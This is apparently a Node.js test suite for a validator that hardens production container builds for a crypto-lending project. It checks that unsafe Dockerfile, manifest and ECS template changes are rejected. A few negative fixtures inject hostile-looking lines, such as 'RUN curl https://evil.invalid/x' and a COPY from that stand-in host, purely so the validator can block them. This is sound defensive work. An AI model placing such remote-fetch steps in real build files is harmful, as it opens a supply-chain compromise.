import assert from 'node:assert/strict';
import { Buffer } from 'node:buffer';
import { spawnSync } from 'node:child_process';
import {
  linkSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join, resolve } from 'node:path';
import process from 'node:process';
import test from 'node:test';
import { fileURLToPath, URL } from 'node:url';

import { validateOciBuildMetadata } from './validate-oci-build-metadata.mjs';
import {
  MAX_PRODUCTION_CONTAINER_SOURCE_BYTES,
  NODE_BASE_IMAGE,
  PRODUCTION_CONTAINER_INPUT_ERROR,
  PRODUCTION_CONTAINER_SOURCE_PATHS,
  RDS_BUNDLE_SHA256,
  loadProductionContainerSourcesForTest,
  validateProductionContainerSources,
  validateProductionContainers,
} from './validate-production-containers.mjs';

const repositoryRoot = resolve(fileURLToPath(new URL('../..', import.meta.url)));
const validatorPath = join(repositoryRoot, 'infra/containers/validate-production-containers.mjs');

function loadSources() {
  return {
    apiDockerfile: readFileSync(join(repositoryRoot, 'Dockerfile.api'), 'utf8'),
    apiPackage: readFileSync(join(repositoryRoot, 'apps/api/package.json')),
    redisSessionRevocationCli: readFileSync(
      join(repositoryRoot, 'apps/api/src/infrastructure/redis/redis-session-revocation.cli.ts'),
      'utf8',
    ),
    redisSessionRevocationRuntime: readFileSync(
      join(repositoryRoot, 'apps/api/src/infrastructure/redis/redis-session-revocation.ts'),
      'utf8',
    ),
    balanceConsumerActivation: readFileSync(
      join(
        repositoryRoot,
        'apps/api/src/blockchain-sync/application/balance-sync-consumer.activation.ts',
      ),
      'utf8',
    ),
    balanceConsumerCli: readFileSync(
      join(repositoryRoot, 'apps/api/src/blockchain-sync/application/balance-sync-consumer.cli.ts'),
      'utf8',
    ),
    balanceConsumerCliMode: readFileSync(
      join(
        repositoryRoot,
        'apps/api/src/blockchain-sync/application/balance-sync-consumer.cli-mode.ts',
      ),
      'utf8',
    ),
    balanceConsumerRuntime: readFileSync(
      join(
        repositoryRoot,
        'apps/api/src/blockchain-sync/application/balance-sync-consumer.runtime.ts',
      ),
      'utf8',
    ),
    applicationTemplate: readFileSync(
      join(repositoryRoot, 'infra/aws/application-baseline.yaml'),
      'utf8',
    ),
    observabilityTemplate: readFileSync(
      join(repositoryRoot, 'infra/aws/application-observability.yaml'),
      'utf8',
    ),
    dockerignore: readFileSync(join(repositoryRoot, '.dockerignore'), 'utf8'),
    migrationTemplate: readFileSync(
      join(repositoryRoot, 'infra/aws/database-migration-task.yaml'),
      'utf8',
    ),
    nextConfig: readFileSync(join(repositoryRoot, 'apps/web/next.config.ts'), 'utf8'),
    rdsBundle: readFileSync(join(repositoryRoot, 'infra/containers/aws-rds-global-bundle.crt')),
    rdsChecksum: readFileSync(
      join(repositoryRoot, 'infra/containers/aws-rds-global-bundle.crt.sha256'),
      'utf8',
    ),
    rootPackage: readFileSync(join(repositoryRoot, 'package.json')),
    webPackage: readFileSync(join(repositoryRoot, 'apps/web/package.json')),
    webDockerfile: readFileSync(join(repositoryRoot, 'Dockerfile.web'), 'utf8'),
  };
}

function replace(source, field, before, after) {
  const original = source[field];
  const text = Buffer.isBuffer(original) ? original.toString('utf8') : original;
  assert.ok(text.includes(before), 'fixture must contain ' + before);
  const changed = text.replace(before, after);
  return { ...source, [field]: Buffer.isBuffer(original) ? Buffer.from(changed) : changed };
}

function assertRejected(source, pattern) {
  const result = validateProductionContainerSources(source);
  assert.equal(result.valid, false);
  assert.match(result.errors.join('\n'), pattern);
}

function withTemporarySourceTree(callback) {
  const root = mkdtempSync(join(tmpdir(), 'production-container-inputs-'));
  try {
    for (const relativePath of PRODUCTION_CONTAINER_SOURCE_PATHS) {
      const destination = join(root, relativePath);
      mkdirSync(dirname(destination), { recursive: true });
      writeFileSync(destination, readFileSync(join(repositoryRoot, relativePath)));
    }
    return callback(root);
  } finally {
    rmSync(root, { force: true, recursive: true });
  }
}

function assertInputRejected(operation) {
  assert.throws(
    operation,
    (error) =>
      error instanceof Error &&
      error.message === PRODUCTION_CONTAINER_INPUT_ERROR &&
      !error.message.includes(tmpdir()),
  );
}

function skipUnsupportedLink(error, context) {
  if (
    error &&
    typeof error === 'object' &&
    ['EPERM', 'EACCES', 'ENOTSUP', 'EINVAL'].includes(error.code)
  ) {
    context.skip(`link creation is unavailable: ${error.code}`);
    return true;
  }
  return false;
}

test('accepts the reviewed production container contract deterministically', () => {
  const first = validateProductionContainerSources(loadSources());
  const second = validateProductionContainerSources(loadSources());

  assert.deepEqual(second, first);
  assert.equal(first.valid, true);
  assert.deepEqual(first.errors, []);
  assert.equal(first.baseImage, NODE_BASE_IMAGE);
  assert.equal(first.rdsBundleSha256, RDS_BUNDLE_SHA256);
});

test('loads exactly the bounded reviewed source set through stable local reads', () => {
  assert.equal(PRODUCTION_CONTAINER_SOURCE_PATHS.length, 18);
  assert.equal(new Set(PRODUCTION_CONTAINER_SOURCE_PATHS).size, 18);
  assert.equal(MAX_PRODUCTION_CONTAINER_SOURCE_BYTES, 393_216);

  withTemporarySourceTree((root) => {
    const result = validateProductionContainerSources(loadProductionContainerSourcesForTest(root));
    assert.equal(result.valid, true, result.errors.join('\n'));
  });
});

test('rejects empty, oversized, malformed-text, and aggregate-exhausting source inputs', () => {
  for (const [relativePath, contents] of [
    ['Dockerfile.api', Buffer.alloc(0)],
    ['Dockerfile.api', Buffer.alloc(16_385, 0x20)],
    ['apps/web/next.config.ts', Buffer.from([0xff])],
  ]) {
    withTemporarySourceTree((root) => {
      writeFileSync(join(root, relativePath), contents);
      assertInputRejected(() => loadProductionContainerSourcesForTest(root));
    });
  }

  withTemporarySourceTree((root) => {
    for (const [relativePath, size] of [
      ['infra/aws/application-baseline.yaml', 65_536],
      ['infra/containers/aws-rds-global-bundle.crt', 196_608],
      ['package.json', 32_768],
      ['apps/api/package.json', 32_768],
      ['apps/web/package.json', 16_384],
      ['Dockerfile.api', 16_384],
      ['Dockerfile.web', 16_384],
    ]) {
      writeFileSync(join(root, relativePath), Buffer.alloc(size, 0x20));
    }
    assertInputRejected(() => loadProductionContainerSourcesForTest(root));
  });
});

test('rejects directory and hard-linked source inputs', () => {
  withTemporarySourceTree((root) => {
    const sourcePath = join(root, 'Dockerfile.api');
    rmSync(sourcePath);
    mkdirSync(sourcePath);
    assertInputRejected(() => loadProductionContainerSourcesForTest(root));
  });

  withTemporarySourceTree((root) => {
    const sourcePath = join(root, 'Dockerfile.api');
    const targetPath = join(root, 'Dockerfile.api.target');
    writeFileSync(targetPath, readFileSync(sourcePath));
    rmSync(sourcePath);
    linkSync(targetPath, sourcePath);
    assertInputRejected(() => loadProductionContainerSourcesForTest(root));
  });
});

test('rejects a symbolic-linked source input when supported', (context) => {
  withTemporarySourceTree((root) => {
    const sourcePath = join(root, 'Dockerfile.api');
    const targetPath = join(root, 'Dockerfile.api.target');
    writeFileSync(targetPath, readFileSync(sourcePath));
    rmSync(sourcePath);
    try {
      symlinkSync(targetPath, sourcePath, 'file');
    } catch (error) {
      if (skipUnsupportedLink(error, context)) return;
      throw error;
    }
    assertInputRejected(() => loadProductionContainerSourcesForTest(root));
  });
});

test('rejects a same-size source rewrite during its stable descriptor read', () => {
  withTemporarySourceTree((root) => {
    const relativePath = 'Dockerfile.api';
    const sourcePath = join(root, relativePath);
    const replacement = readFileSync(sourcePath);
    replacement[0] ^= 1;
    let faultInvoked = false;

    assertInputRejected(() =>
      loadProductionContainerSourcesForTest(root, relativePath, () => {
        faultInvoked = true;
        writeFileSync(sourcePath, replacement);
      }),
    );
    assert.equal(faultInvoked, true);
  });
});

test('rejects non-repository roots through one path-free input failure', () => {
  withTemporarySourceTree((root) => {
    assertInputRejected(() => validateProductionContainers(root));
  });
});

test('rejects mutable, changed, or architecture-pinned base images', () => {
  const source = loadSources();
  assertRejected(
    replace(source, 'apiDockerfile', NODE_BASE_IMAGE, 'node:24.20.0-bookworm-slim'),
    /pin every stage/u,
  );
  assertRejected(
    replace(source, 'webDockerfile', 'FROM node:', 'FROM alpine:'),
    /pin every stage/u,
  );
  assertRejected(
    replace(source, 'apiDockerfile', 'FROM node:', 'FROM --platform=linux/amd64 node:'),
    /architecture|pin every stage/u,
  );
});

test('rejects root users, shell commands, entrypoints, and port drift', () => {
  const source = loadSources();
  assertRejected(
    replace(source, 'apiDockerfile', 'USER 10001:10001', 'USER root'),
    /UID\/GID 10001/u,
  );
  assertRejected(
    replace(source, 'apiDockerfile', 'CMD ["node", "dist/main.js"]', 'CMD node dist/main.js'),
    /exec-form default command|exact exec-form/u,
  );
  assertRejected(
    replace(source, 'webDockerfile', 'ENTRYPOINT []', 'ENTRYPOINT ["sh"]'),
    /clear the base image shell entrypoint/u,
  );
  assertRejected(
    replace(source, 'webDockerfile', 'EXPOSE 3000', 'EXPOSE 8080'),
    /expose port 3000/u,
  );
  assertRejected(
    replace(source, 'apiDockerfile', '/usr/local/bin/corepack', '/tmp/corepack'),
    /remove build-time package managers/u,
  );
});

test('rejects ADD, context-wide copies, ad-hoc downloads, and remote URLs', () => {
  const source = loadSources();
  assertRejected(
    replace(source, 'apiDockerfile', 'COPY package.json', 'ADD package.json'),
    /must not use ADD/u,
  );
  assertRejected(
    replace(source, 'apiDockerfile', 'COPY package.json package-lock.json ./', 'COPY . ./'),
    /complete build context/u,
  );
  assertRejected(
    replace(
      source,
      'webDockerfile',
      'RUN ["npm", "install"',
      'RUN curl https://evil.invalid/x\nRUN ["npm", "install"',
    ),
    /ad-hoc remote|no URL/u,
  );
  assertRejected(
    replace(
      source,
      'webDockerfile',
      'COPY apps/web/package.json',
      'COPY https://evil.invalid/package.json',
    ),
    /ad-hoc remote|no URL/u,
  );
});

test('rejects secret-shaped build arguments and lifecycle-script enablement', () => {
  const source = loadSources();
  assertRejected(
    replace(source, 'apiDockerfile', 'ARG OCI_SOURCE\n', 'ARG OCI_SOURCE\nARG API_TOKEN\n'),
    /credentials|validated OCI/u,
  );
  assertRejected(
    replace(
      source,
      'webDockerfile',
      'NPM_CONFIG_IGNORE_SCRIPTS=true',
      'NPM_CONFIG_IGNORE_SCRIPTS=false',
    ),
    /lifecycle scripts disabled/u,
  );
});

test('rejects image timestamp normalization drift', () => {
  const source = loadSources();
  assertRejected(
    replace(
      source,
      'apiDockerfile',
      'ARG OCI_SOURCE=\n',
      'ARG OCI_SOURCE=https://github.com/Trey-Gleason/Crypto-lending\n',
    ),
    /fail-closed metadata defaults/u,
  );
  assertRejected(
    replace(source, 'webDockerfile', 'ARG SOURCE_DATE_EPOCH=0', 'ARG SOURCE_DATE_EPOCH=1'),
    /timestamp normalization/u,
  );
});

test('rejects npm, lock-install, and workspace command drift', () => {
  const source = loadSources();
  assertRejected(
    replace(source, 'apiDockerfile', 'npm@11.6.4', 'npm@latest'),
    /repository-pinned npm/u,
  );
  assertRejected(
    replace(source, 'webDockerfile', '"ci", "--workspace"', '"install", "--workspace"'),
    /exact workspace lock with npm ci/u,
  );
  assertRejected(
    replace(
      source,
      'rootPackage',
      '"packageManager": "npm@11.6.4"',
      '"packageManager": "npm@11.7.0"',
    ),
    /packageManager/u,
  );
});

test('rejects duplicate package keys, a byte-order mark, and malformed UTF-8', () => {
  const source = loadSources();
  const rootPackage = source.rootPackage.toString('utf8');
  const apiPackage = source.apiPackage.toString('utf8');

  assertRejected(
    {
      ...source,
      rootPackage: Buffer.from(
        rootPackage.replace(
          '"packageManager": "npm@11.6.4",',
          '"packageManager": "npm@latest",\n  "packageManager": "npm@11.6.4",',
        ),
      ),
    },
    /strict UTF-8 JSON without a byte-order mark or duplicate object keys/u,
  );
  assertRejected(
    {
      ...source,
      apiPackage: Buffer.from(
        apiPackage.replace(
          '"start:prod": "node dist/main.js",',
          '"start:prod": "node unsafe.js",\n    "start:prod": "node dist/main.js",',
        ),
      ),
    },
    /duplicate object keys/u,
  );
  assertRejected(
    {
      ...source,
      webPackage: Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), source.webPackage]),
    },
    /byte-order mark/u,
  );
  assertRejected(
    {
      ...source,
      apiPackage: Buffer.concat([source.apiPackage.subarray(0, -1), Buffer.from([0xff, 0x7d])]),
    },
    /strict UTF-8/u,
  );
});

test('rejects a production Solana SDK dependency or missing built-runtime guard', () => {
  const source = loadSources();
  assertRejected(
    replace(
      source,
      'apiPackage',
      '"dependencies": {',
      '"dependencies": {\n    "@solana/web3.js": "1.98.4",',
    ),
    /outside both production dependency graphs/u,
  );
  assertRejected(
    replace(
      source,
      'webDockerfile',
      'RUN ["node", "infra/containers/validate-built-runtime.mjs", "web", "apps/web/.next/standalone"]',
      'RUN ["node", "--version"]',
    ),
    /built-runtime dependency boundary/u,
  );
});

test('rejects balance-consumer source activation, import-order, and command drift', () => {
  const source = loadSources();
  assertRejected(
    replace(source, 'balanceConsumerActivation', 'enabled: false', 'enabled: true'),
    /source activation/u,
  );
  assertRejected(
    replace(
      source,
      'balanceConsumerCliMode',
      "return import('./balance-sync-consumer.runtime');",
      "return import('@nestjs/core');",
    ),
    /dynamic runtime import/u,
  );
  assertRejected(
    replace(
      source,
      'balanceConsumerRuntime',
      '@Module({})',
      '@Module({ imports: [PostgresModule] })',
    ),
    /dependency-empty/u,
  );
  assertRejected(
    replace(
      source,
      'apiPackage',
      'node dist/blockchain-sync/application/balance-sync-consumer.cli.js',
      'node dist/main.js',
    ),
    /API production scripts/u,
  );
  assertRejected(
    replace(
      source,
      'rootPackage',
      'npm run worker:balance:prod --workspace @crypto-lending/api',
      'npm run start:prod --workspace @crypto-lending/api',
    ),
    /Root package/u,
  );
});

test('rejects generic database, infrastructure, and SQS references in the dormant runtime', () => {
  const source = loadSources();

  for (const forbiddenReference of [
    'PostgresModule',
    'SqsModule',
    'InfrastructureConfigModule',
    'MigrationRunner',
    'PostgresService',
    'SqsService',
    'SqsJobWorker',
    'OUTBOX_TRANSPORT',
    'SQS_HEALTH',
    'SQS_CLIENT',
    'SQS_PINNED_QUEUE_RECEIPT',
    'SQS_WORKER_QUEUE',
  ]) {
    assertRejected(
      replace(
        source,
        'balanceConsumerRuntime',
        '@Module({})',
        `const forbiddenRuntimeReference = ${forbiddenReference};\n\n@Module({})`,
      ),
      /dependency-empty/u,
    );
  }
});

test('binds the reviewed Redis revocation sources, package scripts, and task command', () => {
  const source = loadSources();
  assertRejected(
    replace(
      source,
      'redisSessionRevocationRuntime',
      "'ethereum-solana-mainnet'",
      "'ethereum-solana-base-mainnet'",
    ),
    /exact reviewed source/u,
  );
  assertRejected(
    replace(source, 'redisSessionRevocationCli', 'process.argv.slice(2)', "['CLIENT', 'KILL']"),
    /exact reviewed source/u,
  );
  assertRejected(
    replace(
      source,
      'redisSessionRevocationCli',
      'installFatalProcessBoundary(logger);',
      '// fatal process boundary removed',
    ),
    /exact reviewed source/u,
  );
  assertRejected(
    replace(
      source,
      'redisSessionRevocationCli',
      "logger.emit(LOG_EVENTS.workerStopped, 'info', { outcome: 'success' });",
      'process.stdout.write(JSON.stringify(result));',
    ),
    /exact reviewed source/u,
  );
  assertRejected(
    replace(
      source,
      'apiPackage',
      'node dist/infrastructure/redis/redis-session-revocation.cli.js',
      'node dist/main.js',
    ),
    /API production scripts/u,
  );
  assertRejected(
    replace(
      source,
      'observabilityTemplate',
      'Command: [node, dist/infrastructure/redis/redis-session-revocation.cli.js]',
      'Command: [node, dist/main.js]',
    ),
    /Redis revocation task/u,
  );
  assertRejected(
    replace(source, 'observabilityTemplate', "User: '10001:10001'", "User: '0:0'"),
    /Redis revocation task/u,
  );
  assertRejected(
    replace(
      source,
      'observabilityTemplate',
      '${RedisOperatorSecretArn}:password::${RedisOperatorSecretVersionId}',
      '${RedisOperatorSecretArn}:password::',
    ),
    /Redis revocation task/u,
  );
});

test('rejects build-context allowlist weakening or accidental source omission', () => {
  const source = loadSources();
  assertRejected(
    replace(source, 'dockerignore', '**/.env\n', '**/.env\n!.git/\n'),
    /build-context allowlist/u,
  );
  assertRejected(
    replace(source, 'dockerignore', '!apps/web/lib/**\n', ''),
    /build-context allowlist/u,
  );
});

test('rejects standalone web assembly and runtime binding drift', () => {
  const source = loadSources();
  assertRejected(
    replace(source, 'webDockerfile', '.next/standalone /app', '.next/server /app'),
    /standalone server/u,
  );
  assertRejected(
    replace(source, 'nextConfig', "output: 'standalone'", 'output: undefined'),
    /standalone output/u,
  );
  assertRejected(
    replace(source, 'webDockerfile', 'HOSTNAME=0.0.0.0', 'HOSTNAME=127.0.0.1'),
    /every task interface/u,
  );
});

test('rejects API, worker, and migration command or hardening mismatch with ECS', () => {
  const source = loadSources();
  assertRejected(
    replace(
      source,
      'applicationTemplate',
      '      Essential: true\n      Image: !Ref ApiImageUri',
      '      Command: [node, other.js]\n      Essential: true\n      Image: !Ref ApiImageUri',
    ),
    /API task must retain/u,
  );
  assertRejected(
    replace(
      source,
      'applicationTemplate',
      'Command: [node, dist/infrastructure/outbox/outbox-worker.cli.js]',
      'Command: [node, worker.js]',
    ),
    /Worker task commands/u,
  );
  assertRejected(
    replace(
      source,
      'migrationTemplate',
      'dist/infrastructure/database/migration.cli.js',
      'dist/migrate.js',
    ),
    /Migration task command/u,
  );
  assertRejected(
    replace(source, 'applicationTemplate', "User: '10001:10001'", "User: '0:0'"),
    /task user/u,
  );
});

test('rejects RDS bundle substitution, checksum drift, and path drift', () => {
  const source = loadSources();
  const changedBundle = Buffer.from(source.rdsBundle);
  changedBundle[100] ^= 1;
  assertRejected({ ...source, rdsBundle: changedBundle }, /bundle digest/u);
  assertRejected(
    replace(source, 'rdsChecksum', RDS_BUNDLE_SHA256, '0'.repeat(64)),
    /checksum sidecar/u,
  );
  assertRejected(
    replace(source, 'apiDockerfile', '/etc/ssl/certs/aws-rds-global-bundle.pem', '/tmp/rds.pem'),
    /trust bundle/u,
  );
});

test('OCI metadata validation rejects unsafe defaults and malformed values', () => {
  const valid = {
    OCI_CREATED: '2026-09-04T12:00:00Z',
    OCI_REVISION: '1'.repeat(40),
    OCI_SOURCE: 'https://github.com/Trey-Gleason/Crypto-lending',
    SOURCE_DATE_EPOCH: '0',
  };
  assert.deepEqual(validateOciBuildMetadata(valid), []);
  assert.match(
    validateOciBuildMetadata({ ...valid, OCI_REVISION: '0'.repeat(40) }).join(),
    /explicit nonzero/u,
  );
  assert.match(
    validateOciBuildMetadata({ ...valid, OCI_CREATED: '2026-02-31T12:00:00Z' }).join(),
    /canonical UTC/u,
  );
  assert.match(
    validateOciBuildMetadata({ ...valid, OCI_SOURCE: 'https://evil.invalid/repo' }).join(),
    /canonical repository/u,
  );
  assert.match(
    validateOciBuildMetadata({ ...valid, SOURCE_DATE_EPOCH: '1' }).join(),
    /SOURCE_DATE_EPOCH/u,
  );
});

test('CLI emits a stable local-only JSON report and rejects arguments', () => {
  const accepted = spawnSync(process.execPath, [validatorPath, '--json'], {
    cwd: repositoryRoot,
    encoding: 'utf8',
    env: {},
  });
  assert.equal(accepted.status, 0, accepted.stderr);
  const report = JSON.parse(accepted.stdout);
  assert.equal(report.valid, true);
  assert.equal(report.baseImage, NODE_BASE_IMAGE);

  const rejected = spawnSync(process.execPath, [validatorPath, '--root', '.'], {
    cwd: repositoryRoot,
    encoding: 'utf8',
    env: {},
  });
  assert.equal(rejected.status, 2);
  assert.match(rejected.stderr, /Usage:/u);
});
